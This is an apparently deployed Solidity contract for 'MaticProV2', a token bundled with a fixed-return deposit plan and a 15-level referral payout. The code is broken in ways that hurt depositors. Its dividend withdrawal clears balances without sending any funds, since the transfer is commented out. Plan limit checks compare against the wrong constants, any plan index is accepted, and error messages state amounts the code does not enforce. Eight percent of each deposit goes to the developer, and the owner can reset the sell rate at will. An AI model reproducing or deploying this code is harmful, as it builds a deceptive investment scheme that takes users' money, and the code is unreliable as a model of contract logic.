/**
 *Submitted for verification at BscScan.com on 2022-08-25
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract MaticProV2 is Context, Ownable, IBEP20 {
    using SafeMath for uint256;
	
	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
	
       
    uint8 public isScheduled;
    uint8 public isDaily;
    uint256 private constant DAY = 24 hours;
    uint256 private numDays = 1;
    /*
    uint256 public constant plan1_minimum = 5 ether;
    uint256 public constant plan1_maximum = 100 ether;

    uint256 public constant plan2_minimum = 101 ether;
    uint256 public constant plan2_maximum = 500 ether;
    
    uint256 public constant plan3_minimum = 501 ether;
    uint256 public constant plan3_maximum = 1000 ether;
    */

    //after testing erase this and un-comment the commented code above
    //----starts here
    uint256 public constant plan1_minimum = 0.005 ether;
    uint256 public constant plan1_maximum = 0.01 ether;

    uint256 public constant plan2_minimum = 0.011 ether;
    uint256 public constant plan2_maximum = 0.05 ether;
    
    uint256 public constant plan3_minimum = 0.051 ether;
    uint256 public constant plan3_maximum = 0.1 ether;
    //----- ends here

    uint16 constant PERCENT_DIVIDER = 1000; 
    uint16[15] private ref_bonuses = [50, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 20]; 

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public ref_bonus;
      
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 total_invested;
        uint256 total_reinvested;
        uint256 total_withdrawn;
        uint256 total_ref_bonus;
        uint40 lastWithdrawn;
        Deposit[] deposits;
        uint256[15] structure; 
    }

    mapping(address => Player) public players; 
    mapping(uint256 => Tarif) public tarifs;  

    address payable public dev;
    uint256 sellRate = 5000;
    uint256 constant RATE = 1000;
     
    constructor() {
        _name = "MaticProV2 Token";
        _symbol = "MPT";
        _decimals = 18;
        
        _totalSupply =  100_000_000_000 * 10**uint(_decimals); // 100B
        
        //5% for the pool
        _balances[address(this)] = 5_000_000_000 * 10**uint(_decimals); 
		emit Transfer(address(0), address(this), _balances[address(this)]);    
		
        _balances[msg.sender] = 95_000_000_000 * 10**uint(_decimals); 
		emit Transfer(address(0), msg.sender, _balances[msg.sender]);    
		
        tarifs[75] = Tarif(75, 150);
        tarifs[60] = Tarif(60, 150);
        tarifs[50] = Tarif(50, 150);       
        dev = payable(msg.sender);		
    }   

   
    function MakeDeposit(address referral, uint256 _tarif) public payable {
        
        if(_tarif == 50) {
            require(msg.value > plan3_minimum, "Minimum Deposit for Plan 3 is 501 MATIC!");
            require(msg.value <= plan3_maximum, "Maximum Deposit for Plan 3 is 1000 MATIC!");
        }else if(_tarif == 60) {
            require(msg.value > plan2_minimum, "Minimum Deposit for Plan 2 is 101 MATIC!");
            require(msg.value <= plan2_minimum, "Maximum Deposit for Plan 2 is 500 MATIC!");
        }else if(_tarif == 75) {
            require(msg.value >= plan1_minimum, "Minimum Deposit for Plan 1 is 5 MATIC!");
            require(msg.value <= plan1_minimum, "Maximum Deposit for Plan 1 is 100 MATIC!");
        }else{
            require(1==1, "Unknow Tarif Index!");
        }
        
        uint256 tokens = msg.value.mul(RATE);
        transferTokens(address(this), msg.sender, tokens);

        setUpline(msg.sender, referral);

        Player storage player = players[msg.sender];

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));  


        uint256 shares = SafeMath.div(SafeMath.mul(msg.value, 8), 100);
        payable(dev).transfer(shares); 
        
        player.total_invested += msg.value;
        
        invested += msg.value;
        withdrawn += shares;
        commissionPayouts(msg.sender, msg.value);
    }


    function GetDividends() external {
        
        Player storage player = players[msg.sender];

        if(isScheduled == 1) {
            require (block.timestamp >= (player.lastWithdrawn + (DAY * numDays)), "Not due yet for next collection!");
        }     

        getPayout(msg.sender);

        require(player.dividends > 0, "No Income Dividends Yet!");
        uint256 amount = player.dividends;
	
        player.dividends = 0;
        player.total_withdrawn += amount;
        
        /*
        uint256 reinvest = SafeMath.div(SafeMath.mul(amount, 375), 1000); //3 of 8
        uint256 toreceive = SafeMath.div(SafeMath.mul(amount, 625), 1000); // 5 0f 8
 
        payable(msg.sender).transfer(toreceive);
        
        player.deposits.push(Deposit({
            tarif: 75,
            amount: reinvest,
            time: uint40(block.timestamp)
        }));  
        */

        withdrawn += amount;
    
    }

    function setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {

            if(_balances[_upline] <= 0) {
                _upline = owner();
            }
           
            players[_addr].upline = _upline;
          
            for(uint8 i = 0; i < 15; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
          
        }
    }   
    
  
    
    function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            payable(up).transfer(bonus); 
            players[up].total_ref_bonus += bonus;

            ref_bonus += bonus;
            withdrawn += bonus;
			     
            up = players[up].upline;
        }
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, 
                                                            uint256 total_invested, 
                                                                uint256 total_withdrawn, 
                                                                    uint256 total_ref_bonus,  
																		uint40 lastPayout,
																		uint256 numDeposits,
                                                                        uint256[15] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.computePayout(_addr);

        for(uint8 i = 0; i < 15; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends,
            player.total_invested,
            player.total_withdrawn,
            player.total_ref_bonus, 
			player.lastWithdrawn,
			player.deposits.length,
            structure
        );
    }
    

    function memberDeposit(address _addr, uint256 index) view external returns(uint40 time, uint256 amount, uint256 lifedays, uint256 percent)
    {
        Player storage player = players[_addr];
        Deposit storage dep = player.deposits[index];
        Tarif storage tarif = tarifs[dep.tarif];
        return(dep.time, dep.amount, tarif.life_days, tarif.percent);
    }
    
   
    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
        return value;
    }

 
    function getPayout(address _addr) private {
        uint256 payout = this.computePayout(_addr);

        if(payout > 0) {
            players[_addr].lastWithdrawn = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
         

    function transferTokens(address _from, address _to, uint256 amount) private {
        require(_balances[_from].sub(amount) >= 0,"Not enough tokens!");        
        _balances[_to] = _balances[_to].add(amount);
        _balances[_from] = _balances[_from].sub(amount);
        emit Transfer(_from, _to, amount);
    }
	   

    function nextWithdraw(address _addr) view external returns(uint40 next_sked) {
        Player storage player = players[_addr];
        if(player.deposits.length > 0)
        {
          return uint40(player.lastWithdrawn + (DAY * numDays));
        }
        return 0;
    }

    function SellTokens(uint256 amount) external {       
        Player storage player = players[msg.sender];    
        require(_balances[msg.sender] - amount >= 0,"Not enough relics!");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[address(this)] = _balances[address(this)].add(amount);
        emit Transfer(msg.sender, address(this), amount);
        
        uint256 matic = amount.div(sellRate); 
        payable(msg.sender).transfer(matic); 
        withdrawn += matic;
        player.total_withdrawn += matic;
    }
    
   

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }
    
    function setScheduled(uint8 newval) public onlyOwner returns (bool success) {
        isScheduled = newval;
        return true;
    }   
   
    function setDays(uint newval) public onlyOwner returns (bool success) {
        numDays = newval;
        return true;
    }
    
  
    function setSellRate(uint newval) public onlyOwner returns (bool success) {
        sellRate = newval;
        return true;
    }

     
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}